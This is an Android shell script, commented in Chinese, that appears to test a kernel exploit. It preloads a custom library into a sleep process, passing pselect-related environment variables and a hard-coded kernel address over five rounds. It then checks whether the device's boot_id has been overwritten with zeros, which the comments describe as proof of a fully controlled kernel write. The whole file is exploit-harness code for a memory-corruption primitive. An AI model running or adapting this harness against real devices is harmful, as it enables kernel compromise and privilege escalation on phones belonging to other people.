#!/system/bin/sh
# mt27: Case-1 干净零写入验证 — tree_right=0 + boot_id 目标
# 期望: boot_id 前 8 字节 = 0 (00000000-...) = 写形状完全受控
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt25.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt27.txt
RUNLOG=/data/local/tmp/mt27_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
echo "=== 5 轮独立进程 (tree_right=0) ==="
for R in 1 2 3 4 5; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_RIGHT=0 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "round=$R boot_id=$BID" >> $LOG
  case "$BID" in
    00000000-*) echo "★★★ CLEAN ZERO WRITE round=$R ★★★" >> $LOG; break;;
  esac
  sleep 3
done
echo "=== boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
